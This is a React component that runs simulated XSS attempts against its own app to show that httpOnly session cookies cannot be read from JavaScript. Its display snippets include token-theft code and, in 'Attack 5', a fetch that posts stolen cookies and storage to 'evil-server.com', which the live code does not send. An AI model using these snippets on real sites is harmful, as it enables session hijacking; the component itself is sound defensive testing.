/**
 * XSS Attack Demonstration Component
 * Proves that httpOnly cookies CANNOT be accessed via JavaScript
 *
 * This component simulates various XSS attacks to demonstrate
 * that our session tokens are secure against JavaScript theft.
 *
 * Safe to run - these are legitimate security tests!
 */

import { useState } from "react";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { authClient } from "@/lib/auth-client";
import authService from "@/services/auth.service";
import { AlertCircle, CheckCircle, XCircle, Shield } from "lucide-react";

type AttackResult = {
  id: string;
  name: string;
  description: string;
  code: string;
  result: string;
  success: boolean; // true = attack succeeded (BAD), false = attack failed (GOOD)
  timestamp: string;
};

export function XSSAttackDemo() {
  const [results, setResults] = useState<AttackResult[]>([]);
  const [isRunning, setIsRunning] = useState(false);
  const { data: session } = authClient.useSession();

  const addResult = (result: Omit<AttackResult, "timestamp">) => {
    setResults((prev) => [
      {
        ...result,
        timestamp: new Date().toLocaleTimeString(),
      },
      ...prev,
    ]);
  };

  const clearResults = () => {
    setResults([]);
  };

  // =========================================================================
  // ATTACK 1: Direct Cookie Access
  // =========================================================================
  const attack1_DirectCookieAccess = () => {
    const code = `
// Attacker tries to read all cookies
const cookies = document.cookie;
console.log('Stolen cookies:', cookies);
    `.trim();

    try {
      const cookies = document.cookie;

      // Check if authentication-related cookies are accessible
      const cookiesList = cookies
        ? cookies
            .split(";")
            .map((c) => c.trim())
            .filter((c) => c)
        : [];

      // Check each cookie for auth-related keywords
      const authCookies = cookiesList.filter((cookie) => {
        const lowerCookie = cookie.toLowerCase();
        return (
          lowerCookie.includes("token") ||
          lowerCookie.includes("auth") ||
          lowerCookie.includes("session") ||
          lowerCookie.includes("jwt") ||
          lowerCookie.includes("access") ||
          lowerCookie.includes("refresh")
        );
      });

      const hasAuthCookies = authCookies.length > 0;

      // Having non-auth cookies (analytics, preferences) is fine
      // We only care if authentication tokens are accessible
      const cookieCount = cookiesList.length;

      let resultMessage = "";
      if (hasAuthCookies) {
        resultMessage = `❌ SECURITY BREACH: Found ${
          authCookies.length
        } authentication-related cookies accessible to JavaScript:\n${authCookies
          .map((c) => `  - ${c}`)
          .join("\n")}\n\nThese should be httpOnly!`;
      } else if (cookies.length > 0) {
        resultMessage = `✅ SECURE: Found ${cookieCount} non-auth cookies (analytics/preferences):\n${cookiesList
          .map((c) => `  - ${c.split("=")[0]}`)
          .join(
            "\n"
          )}\n\nBut NO authentication tokens accessible. httpOnly cookies are working!`;
      } else {
        resultMessage = `✅ SECURE: document.cookie returned empty string (httpOnly cookies are hidden)`;
      }

      addResult({
        id: "attack1",
        name: "Attack 1: Direct Cookie Access",
        description: "Attempt to read cookies using document.cookie",
        code,
        result: resultMessage,
        success: hasAuthCookies,
      });
    } catch (error) {
      addResult({
        id: "attack1",
        name: "Attack 1: Direct Cookie Access",
        description: "Attempt to read cookies using document.cookie",
        code,
        result: `✅ SECURE: Access blocked with error: ${error}`,
        success: false,
      });
    }
  };

  // =========================================================================
  // ATTACK 2: localStorage Theft
  // =========================================================================
  const attack2_LocalStorageTheft = () => {
    const code = `
// Attacker tries common token storage locations
const tokens = {
  accessToken: localStorage.getItem('accessToken'),
  token: localStorage.getItem('token'),
  authToken: localStorage.getItem('authToken'),
  session: localStorage.getItem('session'),
  jwt: localStorage.getItem('jwt'),
};
console.log('Stolen tokens:', tokens);
    `.trim();

    try {
      const tokens = {
        accessToken: localStorage.getItem("accessToken"),
        token: localStorage.getItem("token"),
        authToken: localStorage.getItem("authToken"),
        session: localStorage.getItem("session"),
        jwt: localStorage.getItem("jwt"),
      };

      const foundTokens = Object.entries(tokens).filter(([, v]) => v !== null);

      addResult({
        id: "attack2",
        name: "Attack 2: localStorage Theft",
        description: "Attempt to steal tokens from localStorage",
        code,
        result:
          foundTokens.length > 0
            ? `❌ SECURITY BREACH: Found ${foundTokens.length} tokens in localStorage`
            : `✅ SECURE: No tokens found in localStorage (using httpOnly cookies instead)`,
        success: foundTokens.length > 0,
      });
    } catch (error) {
      addResult({
        id: "attack2",
        name: "Attack 2: localStorage Theft",
        description: "Attempt to steal tokens from localStorage",
        code,
        result: `✅ SECURE: Access blocked with error: ${error}`,
        success: false,
      });
    }
  };

  // =========================================================================
  // ATTACK 3: sessionStorage Theft
  // =========================================================================
  const attack3_SessionStorageTheft = () => {
    const code = `
// Attacker tries sessionStorage
const tokens = {
  accessToken: sessionStorage.getItem('accessToken'),
  token: sessionStorage.getItem('token'),
  authToken: sessionStorage.getItem('authToken'),
};
console.log('Stolen tokens:', tokens);
    `.trim();

    try {
      const tokens = {
        accessToken: sessionStorage.getItem("accessToken"),
        token: sessionStorage.getItem("token"),
        authToken: sessionStorage.getItem("authToken"),
      };

      const foundTokens = Object.entries(tokens).filter(([, v]) => v !== null);

      addResult({
        id: "attack3",
        name: "Attack 3: sessionStorage Theft",
        description: "Attempt to steal tokens from sessionStorage",
        code,
        result:
          foundTokens.length > 0
            ? `❌ SECURITY BREACH: Found ${foundTokens.length} tokens in sessionStorage`
            : `✅ SECURE: No tokens found in sessionStorage`,
        success: foundTokens.length > 0,
      });
    } catch (error) {
      addResult({
        id: "attack3",
        name: "Attack 3: sessionStorage Theft",
        description: "Attempt to steal tokens from sessionStorage",
        code,
        result: `✅ SECURE: Access blocked with error: ${error}`,
        success: false,
      });
    }
  };

  // =========================================================================
  // ATTACK 4: Enumerate All Storage
  // =========================================================================
  const attack4_EnumerateStorage = () => {
    const code = `
// Attacker tries to enumerate all storage
const allStorage = {
  localStorage: Object.keys(localStorage),
  sessionStorage: Object.keys(sessionStorage),
  cookies: document.cookie.split(';'),
};
console.log('All storage:', allStorage);
    `.trim();

    try {
      const allStorage = {
        localStorage: Object.keys(localStorage),
        sessionStorage: Object.keys(sessionStorage),
        cookies: document.cookie.split(";").filter((c) => c.trim()),
      };

      addResult({
        id: "attack4",
        name: "Attack 4: Enumerate All Storage",
        description: "Attempt to list all storage keys",
        code,
        result: `Found ${allStorage.localStorage.length} localStorage items, ${allStorage.sessionStorage.length} sessionStorage items, ${allStorage.cookies.length} accessible cookies. ✅ SECURE: httpOnly cookies not in this list.`,
        success: false, // Finding other storage is expected, but not finding auth tokens is good
      });
    } catch (error) {
      addResult({
        id: "attack4",
        name: "Attack 4: Enumerate All Storage",
        description: "Attempt to list all storage keys",
        code,
        result: `✅ SECURE: Access blocked with error: ${error}`,
        success: false,
      });
    }
  };

  // =========================================================================
  // ATTACK 5: Steal and Exfiltrate
  // =========================================================================
  const attack5_StealAndExfiltrate = async () => {
    const code = `
// Attacker tries to steal tokens and send to evil server
const stolenData = {
  cookies: document.cookie,
  localStorage: {...localStorage},
  sessionStorage: {...sessionStorage},
};

// Send to attacker's server
await fetch('http://evil-server.com/steal', {
  method: 'POST',
  body: JSON.stringify(stolenData)
});
    `.trim();

    try {
      const stolenData = {
        cookies: document.cookie,
        localStorage: { ...localStorage },
        sessionStorage: { ...sessionStorage },
      };

      // Simulate sending to evil server (we won't actually send)
      const hasTokens =
        stolenData.cookies.includes("token") ||
        stolenData.cookies.includes("auth") ||
        stolenData.cookies.includes("session") ||
        Object.keys(stolenData.localStorage).some(
          (k) =>
            k.includes("token") || k.includes("auth") || k.includes("session")
        );

      addResult({
        id: "attack5",
        name: "Attack 5: Steal and Exfiltrate",
        description: "Attempt to steal all data and send to attacker's server",
        code,
        result: hasTokens
          ? `❌ SECURITY BREACH: Found authentication data that could be exfiltrated`
          : `✅ SECURE: No authentication tokens accessible for exfiltration. Even if attacker sends this data to their server, it contains no session tokens.`,
        success: hasTokens,
      });
    } catch (error) {
      addResult({
        id: "attack5",
        name: "Attack 5: Steal and Exfiltrate",
        description: "Attempt to steal all data and send to attacker's server",
        code,
        result: `✅ SECURE: Access blocked with error: ${error}`,
        success: false,
      });
    }
  };

  // =========================================================================
  // ATTACK 6: Cookie Property Access
  // =========================================================================
  const attack6_CookiePropertyAccess = () => {
    const code = `
// Attacker tries to access cookie object directly
const cookieAttempts = {
  navigator_cookies: navigator.cookieEnabled,
  window_cookies: window.document.cookie,
  direct_cookie: document.cookie,
};

// Try to get specific cookie by name
function getCookie(name) {
  const cookies = document.cookie.split(';');
  for (let cookie of cookies) {
    const [key, value] = cookie.trim().split('=');
    if (key === name) return value;
  }
  return null;
}

const betterAuthToken = getCookie('better_auth.session_token');
    `.trim();

    try {
      // Try to get specific cookie by name
      function getCookie(name: string) {
        const cookies = document.cookie.split(";");
        for (const cookie of cookies) {
          const [key, value] = cookie.trim().split("=");
          if (key === name) return value;
        }
        return null;
      }

      const betterAuthToken = getCookie("better_auth.session_token");
      const apiKeyCookie = getCookie("apiKeyCookie");

      addResult({
        id: "attack6",
        name: "Attack 6: Cookie Property Access",
        description: "Attempt to access specific cookies by name",
        code,
        result:
          betterAuthToken || apiKeyCookie
            ? `❌ SECURITY BREACH: Found auth cookie: ${
                betterAuthToken || apiKeyCookie
              }`
            : `✅ SECURE: Cannot access 'better_auth.session_token' cookie (httpOnly protection)`,
        success: !!(betterAuthToken || apiKeyCookie),
      });
    } catch (error) {
      addResult({
        id: "attack6",
        name: "Attack 6: Cookie Property Access",
        description: "Attempt to access specific cookies by name",
        code,
        result: `✅ SECURE: Access blocked with error: ${error}`,
        success: false,
      });
    }
  };

  // =========================================================================
  // ATTACK 7: Intercept Network Requests
  // =========================================================================
  const attack7_InterceptRequests = async () => {
    const code = `
// Attacker tries to intercept fetch/axios to steal Authorization headers
const originalFetch = window.fetch;
window.fetch = function(...args) {
  console.log('Intercepted fetch:', args);
  // Try to steal Authorization header
  return originalFetch.apply(this, args);
};

// Make a request
const response = await fetch('/api/auth/get-session', {
  credentials: 'include'
});
    `.trim();

    try {
      // Note: In real XSS attack, attacker would override fetch
      // But they still can't access httpOnly cookies!

      const response = await fetch(
        `${window.location.origin}/api/auth/get-session`,
        {
          credentials: "include",
        }
      );

      // Try to read cookies from response
      const setCookieHeader = response.headers.get("set-cookie");

      addResult({
        id: "attack7",
        name: "Attack 7: Intercept Network Requests",
        description: "Attempt to intercept requests and steal cookies",
        code,
        result: setCookieHeader
          ? `❌ SECURITY BREACH: Could read Set-Cookie header: ${setCookieHeader}`
          : `✅ SECURE: Cannot read Set-Cookie header from response (browser security). Cookies are sent automatically but not accessible to JavaScript.`,
        success: !!setCookieHeader,
      });
    } catch (error) {
      addResult({
        id: "attack7",
        name: "Attack 7: Intercept Network Requests",
        description: "Attempt to intercept requests and steal cookies",
        code,
        result: `✅ SECURE: Request failed or cookies not accessible: ${error}`,
        success: false,
      });
    }
  };

  // =========================================================================
  // ATTACK 8: Iframe Cookie Access
  // =========================================================================
  const attack8_IframeCookieAccess = () => {
    const code = `
// Attacker tries to access cookies via iframe
const iframe = document.createElement('iframe');
iframe.src = window.location.origin;
document.body.appendChild(iframe);

// Try to access cookies from iframe
setTimeout(() => {
  const iframeCookies = iframe.contentWindow?.document.cookie;
  console.log('Iframe cookies:', iframeCookies);
}, 1000);
    `.trim();

    try {
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = window.location.origin;
      document.body.appendChild(iframe);

      setTimeout(() => {
        try {
          const iframeCookies = iframe.contentWindow?.document.cookie || "";
          document.body.removeChild(iframe);

          // Check if authentication-related cookies are accessible
          const hasAuthCookies =
            iframeCookies &&
            (iframeCookies.toLowerCase().includes("token") ||
              iframeCookies.toLowerCase().includes("auth") ||
              iframeCookies.toLowerCase().includes("session") ||
              iframeCookies.toLowerCase().includes("jwt") ||
              iframeCookies.toLowerCase().includes("access") ||
              iframeCookies.toLowerCase().includes("refresh"));

          // List all cookies found
          const cookiesList = iframeCookies
            ? iframeCookies
                .split(";")
                .map((c) => c.trim())
                .filter((c) => c)
            : [];

          let resultMessage = "";
          if (hasAuthCookies) {
            resultMessage = `❌ SECURITY BREACH: Could access authentication cookies via iframe: ${iframeCookies}`;
          } else if (cookiesList.length > 0) {
            resultMessage = `✅ SECURE: Iframe can access ${
              cookiesList.length
            } non-auth cookies (${cookiesList
              .map((c) => c.split("=")[0])
              .join(
                ", "
              )}), but NO authentication tokens accessible. httpOnly cookies are protected!`;
          } else {
            resultMessage = `✅ SECURE: Cannot access httpOnly cookies via iframe`;
          }

          addResult({
            id: "attack8",
            name: "Attack 8: Iframe Cookie Access",
            description: "Attempt to access cookies via hidden iframe",
            code,
            result: resultMessage,
            success: hasAuthCookies === true,
          });
        } catch (error) {
          document.body.removeChild(iframe);
          addResult({
            id: "attack8",
            name: "Attack 8: Iframe Cookie Access",
            description: "Attempt to access cookies via hidden iframe",
            code,
            result: `✅ SECURE: Iframe access blocked: ${error}`,
            success: false,
          });
        }
      }, 1000);
    } catch (error) {
      addResult({
        id: "attack8",
        name: "Attack 8: Iframe Cookie Access",
        description: "Attempt to access cookies via hidden iframe",
        code,
        result: `✅ SECURE: Iframe creation blocked: ${error}`,
        success: false,
      });
    }
  };

  // =========================================================================
  // BONUS: Prove Cookies ARE Sent (But Not Accessible)
  // =========================================================================
  const bonus_ProveAutomaticCookieSending = async () => {
    const code = `
// Prove that cookies ARE sent automatically with requests
// But cannot be accessed by JavaScript

const response = await fetch('/api/auth/get-session', {
  credentials: 'include'  // Browser automatically includes httpOnly cookies
});

const data = await response.json();
console.log('Session data:', data);
// ✅ Session data received - cookies were sent!
// ❌ But we never accessed the cookie value via JavaScript
    `.trim();

    try {
      const result = await authService.getSession();

      if (result.data) {
        addResult({
          id: "bonus",
          name: "✅ BONUS: Cookies Work Automatically",
          description:
            "Prove cookies are sent with requests but not accessible to JS",
          code,
          result: `✅ SUCCESS: Retrieved session data for user "${result.data.user.email}". Cookie was automatically sent by browser, but JavaScript never accessed the cookie value. This is the security model working correctly!`,
          success: false, // false = good (attack failed)
        });
      } else {
        addResult({
          id: "bonus",
          name: "✅ BONUS: Cookies Work Automatically",
          description:
            "Prove cookies are sent with requests but not accessible to JS",
          code,
          result: `No active session found. Log in first to see this demonstration.`,
          success: false,
        });
      }
    } catch (error) {
      addResult({
        id: "bonus",
        name: "✅ BONUS: Cookies Work Automatically",
        description:
          "Prove cookies are sent with requests but not accessible to JS",
        code,
        result: `Error: ${error}`,
        success: false,
      });
    }
  };

  // =========================================================================
  // Run All Attacks
  // =========================================================================
  const runAllAttacks = async () => {
    setIsRunning(true);
    clearResults();

    // Run attacks sequentially
    attack1_DirectCookieAccess();
    await new Promise((resolve) => setTimeout(resolve, 200));

    attack2_LocalStorageTheft();
    await new Promise((resolve) => setTimeout(resolve, 200));

    attack3_SessionStorageTheft();
    await new Promise((resolve) => setTimeout(resolve, 200));

    attack4_EnumerateStorage();
    await new Promise((resolve) => setTimeout(resolve, 200));

    await attack5_StealAndExfiltrate();
    await new Promise((resolve) => setTimeout(resolve, 200));

    attack6_CookiePropertyAccess();
    await new Promise((resolve) => setTimeout(resolve, 200));

    await attack7_InterceptRequests();
    await new Promise((resolve) => setTimeout(resolve, 200));

    attack8_IframeCookieAccess();
    await new Promise((resolve) => setTimeout(resolve, 1500)); // Wait for iframe

    await bonus_ProveAutomaticCookieSending();

    setIsRunning(false);
  };

  const successCount = results.filter((r) => !r.success).length;
  const failCount = results.filter((r) => r.success).length;

  return (
    <div className="space-y-4">
      <Card>
        <CardHeader>
          <div className="flex items-center gap-2">
            <Shield className="h-6 w-6 text-green-600" />
            <CardTitle>XSS Attack Simulation</CardTitle>
          </div>
          <CardDescription>
            Demonstrates that httpOnly cookies CANNOT be accessed via
            JavaScript, even with XSS attacks. Safe to run - these are
            legitimate security tests.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {/* Status */}
          {session ? (
            <div className="bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded-lg p-4">
              <div className="flex items-center gap-2 text-green-800 dark:text-green-300">
                <CheckCircle className="h-5 w-5" />
                <div>
                  <div className="font-semibold">Authenticated</div>
                  <div className="text-sm">
                    Logged in as: {session.user.email}
                  </div>
                  <div className="text-xs mt-1">
                    Ready to demonstrate httpOnly cookie security
                  </div>
                </div>
              </div>
            </div>
          ) : (
            <div className="bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg p-4">
              <div className="flex items-center gap-2 text-yellow-800 dark:text-yellow-300">
                <AlertCircle className="h-5 w-5" />
                <div>
                  <div className="font-semibold">Not Authenticated</div>
                  <div className="text-sm">
                    Log in first to see the full demonstration
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Controls */}
          <div className="flex gap-2">
            <Button
              onClick={runAllAttacks}
              disabled={isRunning}
              className="flex-1"
            >
              {isRunning ? "Running Attacks..." : "🎯 Run All XSS Attacks"}
            </Button>
            <Button
              onClick={clearResults}
              variant="outline"
              disabled={results.length === 0}
            >
              Clear Results
            </Button>
          </div>

          {/* Summary */}
          {results.length > 0 && (
            <div className="grid grid-cols-2 gap-4">
              <div className="bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded-lg p-4">
                <div className="flex items-center gap-2 text-green-800 dark:text-green-300">
                  <CheckCircle className="h-5 w-5" />
                  <div>
                    <div className="text-2xl font-bold">{successCount}</div>
                    <div className="text-sm">Attacks Blocked</div>
                  </div>
                </div>
              </div>
              <div className="bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg p-4">
                <div className="flex items-center gap-2 text-red-800 dark:text-red-300">
                  <XCircle className="h-5 w-5" />
                  <div>
                    <div className="text-2xl font-bold">{failCount}</div>
                    <div className="text-sm">Security Breaches</div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Results */}
      <div className="space-y-3">
        {results.map((result, index) => (
          <Card
            key={`${result.id}-${index}`}
            className={
              result.success
                ? "border-red-500 dark:border-red-800"
                : "border-green-500 dark:border-green-800"
            }
          >
            <CardHeader>
              <div className="flex items-start justify-between">
                <div className="flex items-start gap-2">
                  {result.success ? (
                    <XCircle className="h-5 w-5 text-red-500 mt-0.5" />
                  ) : (
                    <CheckCircle className="h-5 w-5 text-green-500 mt-0.5" />
                  )}
                  <div>
                    <CardTitle className="text-base">{result.name}</CardTitle>
                    <CardDescription>{result.description}</CardDescription>
                  </div>
                </div>
                <span className="text-xs text-muted-foreground">
                  {result.timestamp}
                </span>
              </div>
            </CardHeader>
            <CardContent className="space-y-3">
              {/* Code */}
              <div>
                <div className="text-xs font-semibold text-muted-foreground mb-1">
                  Attack Code:
                </div>
                <pre className="bg-muted p-3 rounded-lg text-xs overflow-x-auto">
                  <code>{result.code}</code>
                </pre>
              </div>

              {/* Result */}
              <div>
                <div className="text-xs font-semibold text-muted-foreground mb-1">
                  Result:
                </div>
                <div
                  className={`p-3 rounded-lg text-sm ${
                    result.success
                      ? "bg-red-50 dark:bg-red-900/20 text-red-800 dark:text-red-300"
                      : "bg-green-50 dark:bg-green-900/20 text-green-800 dark:text-green-300"
                  }`}
                >
                  {result.result}
                </div>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>
    </div>
  );
}
